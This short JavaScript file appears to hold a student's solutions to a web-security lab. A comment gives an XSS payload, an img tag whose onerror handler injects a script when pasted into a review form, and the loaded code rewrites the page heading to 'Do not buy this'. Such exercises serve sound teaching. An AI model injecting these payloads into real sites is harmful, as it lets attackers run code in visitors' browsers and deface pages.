/* Task 1 solution: XSS DOM attack; copy paste below 'review' in textarea and press "Submit review"

<img src = 'x' onerror = "(function(){ const script = document.createElement('script'); script.type = 'text/javascript'; script.src = './mySolution.js'; document.body.appendChild(script); })()" />

*/
console.log("hello from mySolution.js");

/* Task 2 solution */
const h2 = document.querySelector("h2");
h2.textContent = "Do not buy this";
